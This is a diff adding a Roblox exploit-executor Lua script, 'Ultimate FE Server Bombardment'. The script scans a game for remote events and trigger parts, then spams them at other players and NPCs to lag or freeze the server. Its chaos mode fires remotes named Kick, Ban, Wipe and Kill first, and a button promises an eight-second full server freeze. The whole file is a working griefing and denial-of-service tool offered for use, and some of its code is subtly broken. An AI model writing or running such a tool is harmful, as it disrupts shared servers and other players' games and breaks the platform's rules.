@@ -1,0 +1,762 @@
+﻿-- ULTIMATE FE SERVER BOMBARDMENT v4.1
+-- FIXED COREGUI BUG - GUI now appears instantly on re-execution
+-- Full-game scan, rate-limited bursts, Auto-Setup, God Mode, chaos meter, Full Freeze button
+
+
+local Services = {
+    Players = game:GetService("Players"),
+    Workspace = game:GetService("Workspace"),
+    CoreGui = game:GetService("CoreGui"),
+    ReplicatedStorage = game:GetService("ReplicatedStorage"),
+    ReplicatedFirst = game:GetService("ReplicatedFirst"),
+    StarterGui = game:GetService("StarterGui"),
+    RunService = game:GetService("RunService"),
+    JointsService = game:GetService("JointsService"),
+    UserInputService = game:GetService("UserInputService"),
+    TweenService = game:GetService("TweenService")
+}
+
+
+local LocalPlayer = Services.Players.LocalPlayer
+
+
+-- Configuration
+local Config = {
+    Active = false,
+    ChaosMode = false,
+    SpamSpeed = "EXTREME",
+    TargetAllPlayers = true,
+    TargetNPCs = true,
+    AutoRescan = true,
+    AutoSetupPhase = true,
+    RateLimitEnabled = true
+}
+
+
+-- Global state
+getgenv().ServerBombardment = getgenv().ServerBombardment or Config
+getgenv().ChaosMode = getgenv().ChaosMode or false
+
+
+-- Cache
+local Cache = {
+    TouchEvents = {},
+    AllRemoteEvents = {},
+    RemoteFunctions = {},
+    TriggerParts = {},
+    OtherPlayers = {},
+    NPCs = {},
+    Stats = {
+        TotalFired = 0,
+        PlayersAffected = 0,
+        RemotesFound = 0
+    },
+    LastFireTime = 0,
+    FireBurstIndex = 1
+}
+
+
+-- Utility
+local function Log(msg)
+    print("[ULTIMATE SERVER BOMBARDMENT v4.1] " .. msg)
+end
+
+
+local function SafeCall(func)
+    local success, err = pcall(func)
+    if success then
+        Cache.Stats.TotalFired = Cache.Stats.TotalFired + 1
+    end
+    return success
+end
+
+
+-- FULL GAME SCAN (every folder)
+local function ScanAllRemotes()
+    Log("Scanning EVERY remote in the ENTIRE game...")
+    
+    Cache.TouchEvents = {}
+    Cache.AllRemoteEvents = {}
+    Cache.RemoteFunctions = {}
+
+
+    local locations = {
+        Services.ReplicatedStorage,
+        Services.ReplicatedFirst,
+        Services.JointsService,
+        Services.Workspace
+    }
+
+
+    local function DeepScanFolder(folder)
+        for _, obj in ipairs(folder:GetChildren()) do
+            if obj:IsA("RemoteEvent") then
+                table.insert(Cache.AllRemoteEvents, obj)
+                if obj.Name == "TouchEvent" then
+                    table.insert(Cache.TouchEvents, obj)
+                end
+            elseif obj:IsA("RemoteFunction") then
+                table.insert(Cache.RemoteFunctions, obj)
+            end
+            DeepScanFolder(obj)
+        end
+    end
+
+
+    for _, location in ipairs(locations) do
+        pcall(function()
+            for _, obj in ipairs(location:GetDescendants()) do
+                -- Handled by DeepScan
+            end
+            DeepScanFolder(location)
+        end)
+    end
+
+
+    Cache.Stats.RemotesFound = #Cache.AllRemoteEvents
+    Log(string.format("Found %d RemoteEvents (%d TouchEvents) and %d RemoteFunctions", 
+        #Cache.AllRemoteEvents, #Cache.TouchEvents, #Cache.RemoteFunctions))
+end
+
+
+local function ScanTriggerParts()
+    Log("Scanning for trigger parts...")
+    Cache.TriggerParts = {}
+
+
+    for _, obj in ipairs(Services.Workspace:GetDescendants()) do
+        if obj:IsA("BasePart") then
+            local name = obj.Name:lower()
+            if name:find("trip") or name:find("trigger") or name:find("touch") or 
+               name:find("seat") or name:find("slide") or name:find("platform") or
+               name:find("button") or name:find("lever") or name:find("zone") or
+               name:find("teleport") or name:find("damage") or name:find("kill") or
+               obj:FindFirstChildOfClass("TouchTransmitter") then
+                table.insert(Cache.TriggerParts, obj)
+            end
+        end
+    end
+    Log(string.format("Found %d trigger parts", #Cache.TriggerParts))
+end
+
+
+local function GetOtherPlayers()
+    Cache.OtherPlayers = {}
+    Cache.NPCs = {}
+
+
+    for _, player in ipairs(Services.Players:GetPlayers()) do
+        if player \~= LocalPlayer and player.Character then
+            local char = player.Character
+            local hrp = char:FindFirstChild("HumanoidRootPart")
+            local humanoid = char:FindFirstChildOfClass("Humanoid")
+            
+            if hrp and humanoid then
+                table.insert(Cache.OtherPlayers, {
+                    Player = player,
+                    Character = char,
+                    HRP = hrp,
+                    Humanoid = humanoid,
+                    Head = char:FindFirstChild("Head"),
+                    Torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso"),
+                    Parts = {}
+                })
+                
+                for _, part in ipairs(char:GetChildren()) do
+                    if part:IsA("BasePart") then
+                        table.insert(Cache.OtherPlayers[#Cache.OtherPlayers].Parts, part)
+                    end
+                end
+            end
+        end
+    end
+
+
+    local npcFolders = {
+        Services.Workspace:FindFirstChild("Customers"),
+        Services.Workspace:FindFirstChild("NPCs"),
+        Services.Workspace:FindFirstChild("Enemies")
+    }
+    
+    for _, folder in ipairs(npcFolders) do
+        if folder then
+            for _, npc in ipairs(folder:GetChildren()) do
+                local hrp = npc:FindFirstChild("HumanoidRootPart")
+                local humanoid = npc:FindFirstChildOfClass("Humanoid")
+                
+                if hrp and humanoid then
+                    table.insert(Cache.NPCs, {
+                        Character = npc,
+                        HRP = hrp,
+                        Humanoid = humanoid
+                    })
+                end
+            end
+        end
+    end
+
+
+    Cache.Stats.PlayersAffected = #Cache.OtherPlayers + #Cache.NPCs
+    return Cache.Stats.PlayersAffected
+end
+
+
+local function MultiArgFire(remote, target)
+    if not remote then return 0 end
+    local count = 0
+
+
+    local targetsToFire = {}
+    if target.HRP then table.insert(targetsToFire, target.HRP) end
+    if target.Character then table.insert(targetsToFire, target.Character) end
+    if target.Humanoid then table.insert(targetsToFire, target.Humanoid) end
+    if target.Player then table.insert(targetsToFire, target.Player) end
+    if target.Player then table.insert(targetsToFire, target.Player.UserId) end
+    table.insert(targetsToFire, target.HRP)
+    table.insert(targetsToFire, target.Character)
+    table.insert(targetsToFire, "activate")
+    table.insert(targetsToFire, true)
+    table.insert(targetsToFire, {player = target.Player or target.Character})
+
+
+    for i = 1, math.min(5, #targetsToFire) do
+        SafeCall(function()
+            remote:FireServer(targetsToFire[i])
+            count = count + 1
+        end)
+    end
+    return count
+end
+
+
+local function GetPriorityRemotes()
+    local priorities = {}
+    local priorityNames = {
+        "Teleport", "Warp", "Reset", "Kick", "Ban", "Wipe", "Delete", "Kill", "Explode", "Boom", "Freeze", "Unfreeze"
+    }
+
+
+    for _, remote in ipairs(Cache.AllRemoteEvents) do
+        local name = remote.Name:lower()
+        for _, prio in ipairs(priorityNames) do
+            if name:find(prio:lower()) then
+                table.insert(priorities, 1, remote)
+                break
+            end
+        end
+    end
+    return priorities
+end
+
+
+local function FireRemotesOnOthers()
+    if #Cache.OtherPlayers == 0 and #Cache.NPCs == 0 then return 0 end
+
+
+    local fireCount = 0
+    local allTargets = {}
+    for _, p in ipairs(Cache.OtherPlayers) do table.insert(allTargets, p) end
+    for _, n in ipairs(Cache.NPCs) do table.insert(allTargets, n) end
+
+
+    local now = tick()
+
+
+    local inAutoSetup = Config.AutoSetupPhase and (now - Cache.LastFireTime < 2)
+    local rate = Config.RateLimitEnabled and 20 or 9999
+    local targetCountPerBurst = math.clamp(rate * 0.6, 10, 25)
+
+
+    local remainingInBurst = targetCountPerBurst - (now - Cache.LastFireTime) * rate
+    local fireThisBurst = math.min(remainingInBurst, targetCountPerBurst)
+
+
+    local toFire = {}
+    if #Cache.AllRemoteEvents > 0 then
+        local toFireCount = math.min(15, math.max(10, fireThisBurst))
+        if Config.ChaosMode then
+            toFire = GetPriorityRemotes()
+        else
+            for i = 1, toFireCount do
+                table.insert(toFire, Cache.AllRemoteEvents[i % #Cache.AllRemoteEvents + 1])
+            end
+        end
+    end
+
+
+    if #toFire > 0 and Config.ChaosMode then
+        toFire = GetPriorityRemotes()
+    end
+
+
+    for _, remote in ipairs(toFire) do
+        for _, target in ipairs(allTargets) do
+            fireCount = fireCount + MultiArgFire(remote, target)
+
+
+            if table.find(Cache.TouchEvents, remote) then
+                for _, triggerPart in ipairs(Cache.TriggerParts) do
+                    SafeCall(function()
+                        remote:FireServer(target.Character, triggerPart)
+                        fireCount = fireCount + 1
+                    end)
+                end
+            end
+        end
+    end
+
+
+    if fireThisBurst > 0 then
+        Cache.LastFireTime = now
+    end
+
+
+    Cache.Stats.TotalFired = Cache.Stats.TotalFired + fireCount
+    return fireCount
+end
+
+
+-- GUI Creation (FIXED CoreGui cleanup)
+local GUI = {}
+
+
+function GUI.Create()
+    -- FIXED: Destroy any old instance of our GUI
+    local oldGui = Services.CoreGui:FindFirstChild("UltimateServerBombardGUI")
+    if oldGui then
+        oldGui:Destroy()
+    end
+
+
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "UltimateServerBombardGUI"
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.Parent = Services.CoreGui
+    
+    -- Main Frame
+    local Main = Instance.new("Frame")
+    Main.Size = UDim2.new(0, 420, 0, 490)
+    Main.Position = UDim2.new(0.5, -210, 0.5, -245)
+    Main.BackgroundColor3 = Color3.fromRGB(12, 12, 22)
+    Main.BorderSizePixel = 0
+    Main.Parent = ScreenGui
+    
+    local MainCorner = Instance.new("UICorner")
+    MainCorner.CornerRadius = UDim.new(0, 16)
+    MainCorner.Parent = Main
+    
+    local MainStroke = Instance.new("UIStroke")
+    MainStroke.Color = Color3.fromRGB(255, 30, 30)
+    MainStroke.Thickness = 3
+    MainStroke.Parent = Main
+    
+    -- Pulsing effect
+    spawn(function()
+        while Main.Parent do
+            Services.TweenService:Create(MainStroke, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.4}):Play()
+            wait(1)
+            Services.TweenService:Create(MainStroke, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0}):Play()
+            wait(1)
+        end
+    end)
+    
+    -- Title
+    local Title = Instance.new("TextLabel")
+    Title.Size = UDim2.new(1, 0, 0, 60)
+    Title.BackgroundColor3 = Color3.fromRGB(220, 20, 40)
+    Title.BorderSizePixel = 0
+    Title.Text = "⚡ ULTIMATE FE SERVER BOMBARDMENT ⚡"
+    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.TextSize = 19
+    Title.Font = Enum.Font.GothamBold
+    Title.Parent = Main
+    
+    local TitleCorner = Instance.new("UICorner")
+    TitleCorner.CornerRadius = UDim.new(0, 16)
+    TitleCorner.Parent = Title
+    
+    local Subtitle = Instance.new("TextLabel")
+    Subtitle.Size = UDim2.new(1, -20, 0, 20)
+    Subtitle.Position = UDim2.new(0, 10, 0, 35)
+    Subtitle.BackgroundTransparency = 1
+    Subtitle.Text = "Full-game remote spam • Other players only • Works on ANY game"
+    Subtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Subtitle.TextSize = 12
+    Subtitle.Font = Enum.Font.Gotham
+    Subtitle.TextTransparency = 0.2
+    Subtitle.TextXAlignment = Enum.TextXAlignment.Left
+    Subtitle.Parent = Title
+    
+    -- Warning
+    local Warning = Instance.new("TextLabel")
+    Warning.Size = UDim2.new(1, -20, 0, 50)
+    Warning.Position = UDim2.new(0, 10, 0, 70)
+    Warning.BackgroundColor3 = Color3.fromRGB(80, 15, 15)
+    Warning.BorderSizePixel = 0
+    Warning.Text = "⚡ SERVER WILL FREEZE • EVERY PLAYER SEES IT ⚡\nMay get kicked for heavy spam!"
+    Warning.TextColor3 = Color3.fromRGB(255, 200, 80)
+    Warning.TextSize = 13
+    Warning.Font = Enum.Font.GothamBold
+    Warning.TextWrapped = true
+    Warning.Parent = Main
+    
+    local WarnCorner = Instance.new("UICorner")
+    WarnCorner.CornerRadius = UDim.new(0, 10)
+    WarnCorner.Parent = Warning
+    
+    -- Stats Frame
+    local StatsFrame = Instance.new("Frame")
+    StatsFrame.Size = UDim2.new(1, -20, 0, 160)
+    StatsFrame.Position = UDim2.new(0, 10, 0, 130)
+    StatsFrame.BackgroundColor3 = Color3.fromRGB(22, 22, 38)
+    StatsFrame.BorderSizePixel = 0
+    StatsFrame.Parent = Main
+    
+    local StatsCorner = Instance.new("UICorner")
+    StatsCorner.CornerRadius = UDim.new(0, 12)
+    StatsCorner.Parent = StatsFrame
+    
+    local function CreateStat(text, yPos, color)
+        local stat = Instance.new("TextLabel")
+        stat.Size = UDim2.new(1, -10, 0, 32)
+        stat.Position = UDim2.new(0, 5, 0, yPos)
+        stat.BackgroundTransparency = 1
+        stat.Text = text
+        stat.TextColor3 = color
+        stat.TextSize = 15
+        stat.Font = Enum.Font.GothamBold
+        stat.TextXAlignment = Enum.TextXAlignment.Left
+        stat.Parent = StatsFrame
+        return stat
+    end
+    
+    GUI.RemoteStat = CreateStat("📡 Remotes Found: 0", 5, Color3.fromRGB(100, 255, 150))
+    GUI.TriggerStat = CreateStat("🎯 Trigger Parts: 0", 37, Color3.fromRGB(255, 200, 100))
+    GUI.TargetStat = CreateStat("👥 Other Players: 0 (+ NPCs)", 69, Color3.fromRGB(255, 150, 255))
+    GUI.FiredStat = CreateStat("💥 Total Fired: 0", 101, Color3.fromRGB(255, 100, 100))
+    GUI.ChaosStat = CreateStat("🌍 Chaos Mode: OFF", 133, Color3.fromRGB(200, 200, 200))
+    
+    -- Chaos Meter
+    GUI.ChaosMeter = Instance.new("Frame")
+    GUI.ChaosMeter.Size = UDim2.new(1, -20, 0, 8)
+    GUI.ChaosMeter.Position = UDim2.new(0, 10, 0, 200)
+    GUI.ChaosMeter.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    GUI.ChaosMeter.Parent = Main
+    
+    local MeterCorner = Instance.new("UICorner")
+    MeterCorner.CornerRadius = UDim.new(0, 4)
+    MeterCorner.Parent = GUI.ChaosMeter
+    
+    GUI.ChaosFill = Instance.new("Frame")
+    GUI.ChaosFill.Size = UDim2.new(0, 0, 1, 0)
+    GUI.ChaosFill.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+    GUI.ChaosFill.Parent = GUI.ChaosMeter
+    
+    local FillCorner = Instance.new("UICorner")
+    FillCorner.CornerRadius = UDim.new(0, 4)
+    FillCorner.Parent = GUI.ChaosFill
+    
+    -- Info
+    local Info = Instance.new("TextLabel")
+    Info.Size = UDim2.new(1, -20, 0, 70)
+    Info.Position = UDim2.new(0, 10, 0, 218)
+    Info.BackgroundTransparency = 1
+    Info.Text = "• Rate-limited bursts + Auto-Setup phase\n• God Mode = strongest remotes first\n• Full game scan • Any game"
+    Info.TextColor3 = Color3.fromRGB(180, 180, 200)
+    Info.TextSize = 12
+    Info.Font = Enum.Font.Gotham
+    Info.TextWrapped = true
+    Info.TextYAlignment = Enum.TextYAlignment.Top
+    Info.Parent = Main
+    
+    -- Status
+    GUI.Status = Instance.new("TextLabel")
+    GUI.Status.Size = UDim2.new(1, -20, 0, 38)
+    GUI.Status.Position = UDim2.new(0, 10, 0, 295)
+    GUI.Status.BackgroundTransparency = 1
+    GUI.Status.Text = "💤 INACTIVE"
+    GUI.Status.TextColor3 = Color3.fromRGB(150, 150, 150)
+    GUI.Status.TextSize = 22
+    GUI.Status.Font = Enum.Font.GothamBold
+    GUI.Status.Parent = Main
+    
+    -- Toggle Button
+    GUI.Toggle = Instance.new("TextButton")
+    GUI.Toggle.Size = UDim2.new(1, -20, 0, 58)
+    GUI.Toggle.Position = UDim2.new(0, 10, 0, 335)
+    GUI.Toggle.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
+    GUI.Toggle.BorderSizePixel = 0
+    GUI.Toggle.Text = "🔥 START SERVER BOMBARDMENT 🔥"
+    GUI.Toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    GUI.Toggle.TextSize = 19
+    GUI.Toggle.Font = Enum.Font.GothamBold
+    GUI.Toggle.Parent = Main
+    
+    local ToggleCorner = Instance.new("UICorner")
+    ToggleCorner.CornerRadius = UDim.new(0, 12)
+    ToggleCorner.Parent = GUI.Toggle
+    
+    -- Full Freeze Button
+    GUI.FullFreezeBtn = Instance.new("TextButton")
+    GUI.FullFreezeBtn.Size = UDim2.new(1, -20, 0, 50)
+    GUI.FullFreezeBtn.Position = UDim2.new(0, 10, 0, 400)
+    GUI.FullFreezeBtn.BackgroundColor3 = Color3.fromRGB(80, 20, 150)
+    GUI.FullFreezeBtn.BorderSizePixel = 0
+    GUI.FullFreezeBtn.Text = "🌍 FULL SERVER FREEZE (8s)"
+    GUI.FullFreezeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    GUI.FullFreezeBtn.TextSize = 18
+    GUI.FullFreezeBtn.Font = Enum.Font.GothamBold
+    GUI.FullFreezeBtn.Parent = Main
+    
+    local FreezeCorner = Instance.new("UICorner")
+    FreezeCorner.CornerRadius = UDim.new(0, 10)
+    FreezeCorner.Parent = GUI.FullFreezeBtn
+    
+    -- Close Button
+    local Close = Instance.new("TextButton")
+    Close.Size = UDim2.new(0, 50, 0, 50)
+    Close.Position = UDim2.new(1, -55, 0, 5)
+    Close.BackgroundTransparency = 1
+    Close.Text = "✕"
+    Close.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Close.TextSize = 28
+    Close.Font = Enum.Font.GothamBold
+    Close.Parent = Title
+    
+    -- Dragging
+    local dragging, dragInput, dragStart, startPos
+    
+    Title.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            dragStart = input.Position
+            startPos = Main.Position
+        end
+    end)
+    
+    Title.InputChanged:Connect(function(input)
+        if input.UserInputState == Enum.UserInputState.End then
+            dragging = false
+        end
+    end)
+    
+    Title.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement then
+            dragInput = input
+        end
+    end)
+    
+    Services.UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local delta = input.Position - dragStart
+            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+    
+    -- Button Actions
+    GUI.Toggle.MouseButton1Click:Connect(function()
+        Config.Active = not Config.Active
+        getgenv().ServerBombardment.Active = Config.Active
+        getgenv().ChaosMode = Config.ChaosMode
+        GUI.UpdateStatus()
+    end)
+    
+    GUI.FullFreezeBtn.MouseButton1Click:Connect(function()
+        if Config.Active then
+            Config.ChaosMode = true
+            getgenv().ChaosMode = true
+            GUI.ChaosModeLabel.Text = "🌍 Chaos Mode: ON (GOD MODE)"
+            GUI.ChaosModeLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+            Log("FULL SERVER FREEZE INITIATED - 8 seconds of maximum lag!")
+            
+            task.delay(8, function()
+                if Config.Active then
+                    Config.Active = false
+                    getgenv().ServerBombardment.Active = false
+                    GUI.UpdateStatus()
+                    Log("Auto-paused after Full Freeze")
+                end
+            end)
+        end
+    end)
+    
+    Close.MouseButton1Click:Connect(function()
+        Config.Active = false
+        Config.ChaosMode = false
+        ScreenGui:Destroy()
+    end)
+    
+    GUI.ChaosModeLabel = CreateStat("🌍 Chaos Mode: OFF", 133, Color3.fromRGB(200, 200, 200))
+    GUI.ChaosModeLabel.Text = "🌍 Chaos Mode: OFF"
+    GUI.ChaosModeLabel.MouseButton1Click:Connect(function()
+        Config.ChaosMode = not Config.ChaosMode
+        getgenv().ChaosMode = Config.ChaosMode
+        if Config.ChaosMode then
+            GUI.ChaosModeLabel.Text = "🌍 Chaos Mode: ON (GOD MODE)"
+            GUI.ChaosModeLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+        else
+            GUI.ChaosModeLabel.Text = "🌍 Chaos Mode: OFF"
+            GUI.ChaosModeLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+        end
+        GUI.UpdateStatus()
+    end)
+end
+
+
+function GUI.UpdateStats()
+    if not GUI.RemoteStat then return end
+    
+    GUI.RemoteStat.Text = string.format("📡 Remotes Found: %d (%d Touch)", #Cache.AllRemoteEvents, #Cache.TouchEvents)
+    GUI.TriggerStat.Text = string.format("🎯 Trigger Parts: %d", #Cache.TriggerParts)
+    GUI.TargetStat.Text = string.format("👥 Other Players: %d (+ %d NPCs)", #Cache.OtherPlayers, #Cache.NPCs)
+    
+    local formatted = Cache.Stats.TotalFired >= 1000000 and string.format("%.1fM", Cache.Stats.TotalFired / 1000000) or
+                     Cache.Stats.TotalFired >= 1000 and string.format("%.1fK", Cache.Stats.TotalFired / 1000) or
+                     tostring(Cache.Stats.TotalFired)
+    
+    GUI.FiredStat.Text = "💥 Total Fired: " .. formatted
+    
+    local chaosText = getgenv().ChaosMode and "🌍 Chaos Mode: ON (GOD MODE)" or "🌍 Chaos Mode: OFF"
+    GUI.ChaosStat.Text = chaosText
+    GUI.ChaosStat.TextColor3 = getgenv().ChaosMode and Color3.fromRGB(255, 50, 50) or Color3.fromRGB(200, 200, 200)
+end
+
+
+function GUI.UpdateStatus()
+    if not GUI.Status or not GUI.Toggle then return end
+    
+    if Config.Active then
+        GUI.Status.Text = Config.ChaosMode and "🔥 SERVER LAGGING HARD!" or "💤 INACTIVE"
+        GUI.Status.TextColor3 = Config.ChaosMode and Color3.fromRGB(255, 50, 50) or Color3.fromRGB(255, 255, 50)
+        GUI.Toggle.Text = "⏸️ PAUSE BOMBARDMENT"
+        GUI.Toggle.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+        GUI.ChaosStat.Text = getgenv().ChaosMode and "🌍 Chaos Mode: ON (GOD MODE)" or "🌍 Chaos Mode: OFF"
+    else
+        GUI.Status.Text = "💤 INACTIVE"
+        GUI.Status.TextColor3 = Color3.fromRGB(150, 150, 150)
+        GUI.Toggle.Text = "🔥 START SERVER BOMBARDMENT 🔥"
+        GUI.Toggle.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
+        GUI.ChaosStat.Text = getgenv().ChaosMode and "🌍 Chaos Mode: ON (GOD MODE)" or "🌍 Chaos Mode: OFF"
+    end
+end
+
+
+-- Main Loop
+spawn(function()
+    while true do
+        Services.RunService.Heartbeat:Wait()
+        
+        if Config.Active then
+            GetOtherPlayers()
+            FireRemotesOnOthers()
+        end
+    end
+end)
+
+
+-- Stats Loop
+spawn(function()
+    while true do
+        wait(0.4)
+        if GUI.RemoteStat then
+            GUI.UpdateStats()
+        end
+    end
+end)
+
+
+-- Auto Rescan
+spawn(function()
+    while true do
+        wait(10)
+        if Config.AutoRescan then
+            ScanAllRemotes()
+            ScanTriggerParts()
+        end
+    end
+end)
+
+
+-- Initialize
+Log("Initializing ULTIMATE FE SERVER BOMBARDMENT v4.1...")
+ScanAllRemotes()
+ScanTriggerParts()
+GetOtherPlayers()
+GUI.Create()
+GUI.UpdateStats()
+GUI.UpdateStatus()
+
+
+Services.StarterGui:SetCore("SendNotification", {
+    Title = "✓ Ultimate Server Bombardment v4.1 Loaded";
+    Text = string.format("%d remotes | %d players | GUI fixed!", #Cache.AllRemoteEvents, #Cache.OtherPlayers);
+    Duration = 5
+})
+
+
+Log("Ready! GUI now appears instantly on re-execution.")
+Log(string.format("Found: %d remotes, %d triggers, %d other players", 
+    #Cache.AllRemoteEvents, #Cache.TriggerParts, #Cache.OtherPlayers))
+
+
+-- Console Commands
+getgenv().ServerBombardment.Start = function()
+    Config.Active = true
+    getgenv().ChaosMode = Config.ChaosMode
+    GUI.UpdateStatus()
+end
+
+
+getgenv().ServerBombardment.Stop = function()
+    Config.Active = false
+    getgenv().ChaosMode = false
+    GUI.UpdateStatus()
+end
+
+
+getgenv().ServerBombardment.Rescan = function()
+    ScanAllRemotes()
+    ScanTriggerParts()
+    GetOtherPlayers()
+    GUI.UpdateStats()
+    Log("Rescan complete!")
+end
+
+
+getgenv().ServerBombardment.Stats = Cache.Stats
+
+
+getgenv().ChaosMode = function(state)
+    if state == nil then
+        Config.ChaosMode = not Config.ChaosMode
+        getgenv().ChaosMode = Config.ChaosMode
+    else
+        Config.ChaosMode = state
+        getgenv().ChaosMode = state
+    end
+    GUI.UpdateStatus()
+    Log("Chaos Mode set to: " .. tostring(getgenv().ChaosMode))
+end
+
+
+getgenv().FullFreeze = function()
+    if Config.Active then
+        Config.ChaosMode = true
+        getgenv().ChaosMode = true
+        GUI.ChaosModeLabel.Text = "🌍 Chaos Mode: ON (GOD MODE)"
+        GUI.ChaosModeLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+        Log("FULL SERVER FREEZE INITIATED - 8 seconds of maximum lag!")
+        
+        task.delay(8, function()
+            if Config.Active then
+                Config.Active = false
+                getgenv().ServerBombardment.Active = false
+                GUI.UpdateStatus()
+                Log("Auto-paused after Full Freeze")
+            end
+        end)
+    end
+end
+
+
+Log("All console commands loaded: ChaosMode(true/false), FullFreeze()")
